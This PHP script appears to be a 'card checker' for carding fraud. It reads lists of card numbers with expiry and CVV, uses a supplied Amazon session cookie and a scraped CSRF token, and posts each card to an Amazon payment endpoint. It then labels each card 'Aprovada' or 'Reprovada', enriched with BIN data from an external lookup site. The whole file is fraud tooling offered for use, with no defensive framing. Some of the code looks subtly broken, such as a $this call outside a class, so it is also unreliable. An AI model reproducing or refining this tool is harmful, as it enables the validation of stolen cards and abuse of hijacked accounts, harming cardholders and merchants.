<?php
error_reporting(0);
ignore_user_abort(true);

// ==================== FUNCIONES ORIGINALES (MANTENIDAS) ====================
function getstr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getstr2($string, $start, $end, $line = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$line]);
    return $str[0];
}

function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function getBin($cc) {
    return substr($cc, 0, 6);
}

function gerarLetrasAleatorias($quantidade) {
    $letras = 'abcdefghijklmnopqrstuvwxyz';
    $tamanhoLetras = strlen($letras);
    $resultado = '';
    for ($i = 0; $i < $quantidade; $i++) {
        $indice = rand(0, $tamanhoLetras - 1);
        $resultado .= $letras[$indice];
    }
    return $resultado;
}

function convertCookie($text, $outputFormat = 'US') {
    $countryCodes = [
        'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
        'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
        'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
    ];
    
    if (!array_key_exists($outputFormat, $countryCodes)) {
        return $text;
    }
    $currentCountry = $countryCodes[$outputFormat];
    $text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg'], $currentCountry['code'], $text);
    $text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
    $text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
    return $text;
}

// ==================== VALIDACIÓN MEJORADA 2025 ====================
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning"></span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

// ==================== VALIDACIONES MEJORADAS 2025 ====================
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
if ((int)$mes < 1 || (int)$mes > 12) {
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Mes inválido </span> ➔ <span class="text-warning"></span><br>');
}

if ((int)$ano < date('Y') || (int)$ano > date('Y') + 15) {
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Año inválido </span> ➔ <span class="text-warning"></span><br>');
}

// ==================== COOKIES ACTUALIZADAS 2025 ====================
$cookieprim = $_GET['cookie1'] ?? '';
if(empty($cookieprim)) {
    die('Cookie Amazon.com requerida');
}

session_start();
if(!isset($_SESSION['cookie_index'])){ 
    $_SESSION['cookie_index'] = 0; 
}

$cookieprim = trim($cookieprim);
$_com_cookie = convertCookie($cookieprim, 'US');
$time = time();

// ==================== BIN CHECK ACTUALIZADO 2025 ====================
$bin = substr($cc, 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bins.antipublic.cc/bins/" . $bin);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
$puxarbins = curl_exec($ch);
curl_close($ch);

$data = json_decode($puxarbins, true);
$pais = $data['country_name'] ?? 'Desconocido';
$bandeira = $data['brand'] ?? 'Desconocido';
$tipo = $data['type'] ?? 'Desconocido';
$nivel = $data['level'] ?? 'Desconocido';
$banco = $data['bank'] ?? 'Desconocido';
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$informacoes = strtoupper(strtolower($INFO));

// ==================== FLUJO PRINCIPAL ACTUALIZADO 2025 ====================
$first_name = "Amazon";
$last_name = "Customer";
$fullnamekk = "$first_name $last_name";

// 1. OBTENER SESIÓN ACTUALIZADA
$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo', // URL ACTUALIZADA
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE => $_com_cookie,
    CURLOPT_ENCODING => "gzip",
    CURLOPT_HTTPHEADER => array(
        'Host: www.amazon.com',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
    ),
]);
$r = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Verificar si la cookie sigue activa
if (strpos($r, "Sign in") !== false || $httpCode == 403) {
    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookie expirada o inválida </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
}

// 2. OBTENER CSRF TOKEN ACTUALIZADO
$csrf = getstr($r, 'csrfToken["\']?\\s*[:=]\\s*["\']', '"');
if (empty($csrf)) {
    $csrf = getstr($r, 'data-csrf-token=["\']', '"'); // Formato alternativo 2025
}

if (empty($csrf)) {
    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> No se pudo obtener token de seguridad </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
}

// 3. AGREGAR TARJETA (MÉTODO ACTUALIZADO 2025)
$cookie2 = convertCookie($cookieprim, 'US');
$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.amazon.com/payments/api/v3/instruments', // ENDPOINT ACTUALIZADO
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_ENCODING => "gzip",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode([
        'paymentInstrument' => [
            'type' => 'CreditCard',
            'number' => $cc,
            'expiry' => [
                'month' => intval($mes),
                'year' => intval($ano)
            ],
            'securityCode' => $cvv,
            'holderName' => $fullnamekk
        ],
        'billingAddress' => ['useDefault' => true]
    ]),
    CURLOPT_HTTPHEADER => array(
        'Host: www.amazon.com',
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json',
        'X-CSRF-Token: ' . $csrf,
        'X-Requested-With: XMLHttpRequest',
        'Origin: https://www.amazon.com',
        'Referer: https://www.amazon.com/cpe/yourpayments/wallet',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Accept-Language: en-US,en;q=0.9',
    )
]);
$r = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 4. VERIFICAR RESPUESTA ACTUALIZADA
if ($httpCode == 200) {
    $responseData = json_decode($r, true);
    
    if (isset($responseData['paymentInstrumentId'])) {
        // TARJETA AGREGADA EXITOSAMENTE - VERIFICAR PRIME
        $cardId = $responseData['paymentInstrumentId'];
        
        // VERIFICACIÓN PRIME SIMPLIFICADA 2025
        $primeCheck = $this->checkPrimeSimplified($cardId, $csrf, $cookie2);
        
        if ($primeCheck) {
            die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Tarjeta verificada ✅ ('.$informacoes.') </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
        } else {
            die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Tarjeta válida ✅ ('.$informacoes.') </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
        }
    }
}

// 5. MANEJO DE ERRORES ACTUALIZADO
if (strpos($r, 'INVALID_CARD') !== false || strpos($r, 'DECLINED') !== false) {
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Tarjeta declinada ('.$informacoes.') </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
}

if (strpos($r, 'RATE_LIMIT') !== false || $httpCode == 429) {
    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Límite de verificaciones excedido </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');
}

// ERROR GENÉRICO
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error en verificación ('.$httpCode.') </span> ➔ Tiempo: (' . (time() - $time) . 's)<br>');

// ==================== FUNCIÓN AUXILIAR ACTUALIZADA ====================
function checkPrimeSimplified($cardId, $csrf, $cookie) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.amazon.com/prime/api/eligibility',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'paymentMethodId' => $cardId,
            'verificationType' => 'QUICK_CHECK'
        ]),
        CURLOPT_COOKIE => $cookie,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'X-CSRF-Token: ' . $csrf,
            'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ],
        CURLOPT_TIMEOUT => 10
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    return isset($data['eligible']) && $data['eligible'] === true;
}
?>